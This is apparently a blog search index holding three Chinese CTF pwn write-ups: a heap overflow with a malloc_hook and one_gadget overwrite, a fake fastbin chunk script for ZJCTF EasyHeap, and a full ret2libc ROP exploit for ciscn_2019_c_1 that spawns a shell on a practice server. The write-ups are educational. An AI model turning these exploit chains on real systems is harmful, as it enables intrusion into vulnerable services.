<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ZJCTF2019-EasyHeap</title>
    <link href="/2021/07/29/roarctf_2019_easy_pwn/"/>
    <url>/2021/07/29/roarctf_2019_easy_pwn/</url>
    
    <content type="html"><![CDATA[<p>白天睡觉，晚上来写道题。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题涉及了unsortedbins，malloc_hook，堆溢出。</p><p>heap的菜单选项常规题，做到目前为止，主要是两个思路：</p><p>先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。</p><p>在create函数中可以明显看出来这是个结构体</p><p><img src="/img/roarctf_2019_easy_pwn-1.png" alt="roarctf_2019_easy_pwn-1"></p><p>一个结构体有24个字节，前8个为标志位，中间8个size位，后8个是alloc出来的chunk的指针。</p><p>（alloc和malloc不同的是 alloc的free后会清空用户数据区）</p><p>其中a1 为基地址，我一开始还打算去找这个a1，</p><p>但是看到这个a1的初始化。</p><p><img src="/img/roarctf_2019_easy_pwn-2.png" alt="roarctf_2019_easy_pwn-2"></p><p>这里面buf是随机数字，所以a1搜寻未果。</p><p><img src="/img/roarctf_2019_easy_pwn-3.png" alt="roarctf_2019_easy_pwn-3"></p><p>fill函数中，没有根据chunk的大小来限制写入大小。所以存在着溢出漏洞。</p><p>主要思路就是，根据unsorted bin 中的fd。利用main_arean泄露libc（这个还没有查阅资料）</p><p>然后利用之前布置好的盖在小块的大块来dump出来。</p><p>接下来是漏洞利用。钩子函数详细，可以查阅这个资料<br><a href="https://blog.csdn.net/qq_41453285/article/details/99315504">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p><p>里面介绍的很清晰，具体思路就是，在钩子函数之前有一个为末位的一块内存区域，因为fastbin中没有对齐限制。所以我们可以修改fastbin中最后一个的fd指针，指向这里，让fastbin将它加入，然后在malloc一下，之后就可以通过溢出（具体溢出长度，上面那个资料中有详细的介绍）来修改malloc_hook 处的内容：malloc函数执行的时候会先检测__malloc_hook是否为空，如果不为空就执行__mallochook。所以这时候把malloc_hook 修改为一个one_gadget的地址（好像是存在这几个固定的地址。只需要libc的基地址加上这个偏移）</p><p>那么最后再malloc一个chunk就可以触发 one_gadget。</p><p>果然还是多做题才能多涨姿势。</p><p>但是套路应该就是这几个套路了。</p><p>难题可能在泄露libc上下难度，目前我觉得应该就是这几个套路了，后续继续学习新的漏洞利用手段。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF2019-EasyHeap</title>
    <link href="/2021/07/27/ZJCTF2019-EasyHeap/"/>
    <url>/2021/07/27/ZJCTF2019-EasyHeap/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/ZJCTF2019-EasyHeap-1.png" alt="[ZJCTF 2019]EasyHeap-1"></p><p> 做题先check找攻击手段，Partial RELRP -&gt; 修改got表</p><p><img src="/img/ZJCTF2019-EasyHeap-2.png" alt="[ZJCTF 2019]EasyHeap-2"></p><p>菜单题，直接找准delete看看有没有UAF。</p><p><img src="/img/ZJCTF2019-EasyHeap-3.png" alt="[ZJCTF 2019]EasyHeap-3"></p><p>UAF未果。</p><p><img src="/img/ZJCTF2019-EasyHeap-4.png" alt="[ZJCTF 2019]EasyHeap-4"></p><p>但是在Edit_heap中存在漏洞。</p><p>这里看起来是以为可以修改heap的size，其实这个size是用来对你的输入进行限制的。（<a href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a>就在这里把size写的很大，方便我们写入）</p><p><img src="/img/ZJCTF2019-EasyHeap-5.png" alt="[ZJCTF 2019]EasyHeap-5"></p><p>而且这个程序写的会让你修改chunk的信息域</p><p>所以 wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;26279&quot;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)   <span class="hljs-comment">#create 0 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)   <span class="hljs-comment">#create 1 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3\n&#x27;</span>)   <span class="hljs-comment"># free 1</span><br>sh.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)<br>x = p64(<span class="hljs-number">0x0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>)  + p64(<span class="hljs-number">0x6020ad</span>) + p64(<span class="hljs-number">0x0</span>)  <span class="hljs-comment">#create fake chunk</span><br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-string">&#x27;0\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;1000\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,x)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)      <span class="hljs-comment">#create 1 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/BengDouLove/article/details/105391153?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162731259516780271593086%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162731259516780271593086&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-105391153.first_rank_v2_pc_rank_v29&utm_term=BUUCTF+%5BZJCTF+2019%5DEasyHeap&spm=1018.2226.3001.4187">参考链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_c_1</title>
    <link href="/2021/05/25/ciscn_2019_c_1/"/>
    <url>/2021/05/25/ciscn_2019_c_1/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/img/ciscn_2019_c_1-1.png"></p><p>F5反汇编main函数后，会让我们选择函数。我们注意到</p><p><img src="/img/ciscn_2019_c_1-2.png"></p><p>encrypt函数中存在着gets(s) 栈溢出漏洞。</p><p>但是并没有存在system函数，所以我们不能直接利用。</p><p>所以我们要用ret2libc技术，先考虑泄露libc基地址。</p><p>在mian和encrypt函数中都出现了puts函数</p><p>我们知道根据延迟绑定技术：</p><p><em>plt表中的函数如果没有被调用过，那么got表中该函数的对应项则指向plt表的第二行指令。当完成了第一次调用后，got表中会存放函数的真实地址，plt表这时候只起到调用的作用。</em></p><h1 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h1><p>所以，puts函数既被函数调用了，又可以输出一些东西，可以成为我们ret2libc技术的好帮手。</p><p>所以我们第一个payload1应该是</p><p><code>payload1=b&quot;a&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</code></p><p>第一次写，我可能写的比较啰嗦</p><p>记一下笔记：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. ‘a&#x27;*<span class="hljs-number">88</span>前加b的原因是 py3中 char类型想要用+拼接要加上b强制转换。<br><span class="hljs-attribute">2</span>. pop_rdi_addr  是因为在x64中，函数调用优先使用寄存器。超过<span class="hljs-number">6</span>个参数后才使用栈传参。<br><span class="hljs-attribute">3</span>. puts_got是把puts函数的真实地址传递给rdi<br><span class="hljs-attribute">4</span>. puts_plt用于作为返回地址调用函数<br><span class="hljs-attribute">5</span>. 最后我们再次进入整个程序。<br></code></pre></td></tr></table></figure><p>接下来我们提交过后需要接收puts函数的真实位置，再根据libc不同版本下puts函数的偏移，来计算出libc基地址。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>))`<br><br><span class="hljs-selector-attr">[:-1]</span>代表的是取该行字符串除去最后一个字符外的字符串。（可能是因为最后一个字符是个换行符）<br><br><span class="hljs-function"><span class="hljs-title">ljust</span><span class="hljs-params">(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>)</span></span>的意思是 接收<span class="hljs-number">8</span>个字符，再加上\<span class="hljs-number">0</span> 成为一个字符串<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>接下来暴露了libc地址，就是简单的rop了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">ru</span>=lambda x:io.recvuntil(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><span class="hljs-attribute">sla</span>=lambda x,y:io.sendlineafter(x,y)<br><span class="hljs-attribute">io</span>=remote(&#x27;node3.buuoj.cn&#x27;,******)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_c_1&#x27;)<br><span class="hljs-attribute">ret</span>=0x4006b9<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>rl()<br>rl()<br><span class="hljs-attribute">puts</span>=u64(ru(&#x27;\n&#x27;)[:-1].ljust(8,b<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;puts&#x27;,puts)<br><span class="hljs-attribute">libc_addr</span>=puts-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">binsh</span>=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">system</span>=libc_addr+libc.dump(&#x27;system&#x27;)<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
